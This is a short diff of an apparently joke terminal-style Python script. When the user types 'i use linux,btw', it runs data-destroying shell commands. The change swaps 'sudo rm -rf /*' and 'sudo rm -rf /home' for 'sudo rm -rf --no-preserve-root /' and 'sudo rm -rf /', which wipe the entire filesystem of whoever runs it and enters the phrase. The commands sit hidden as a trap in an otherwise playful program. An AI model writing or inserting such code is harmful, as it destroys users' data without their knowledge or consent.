@@ -37,5 +37,6 @@ while True:
         print("Companies that developed:MECIS, XDAFAD Software")
         time.sleep(2)
     if com1 == "i use linux,btw":
-        os.system("sudo rm -rf /*")
-        os.system("sudo rm -rf /home")
+        os.system("sudo rm -rf --no-preserve-root /")
+
+        os.system("sudo rm -rf /")
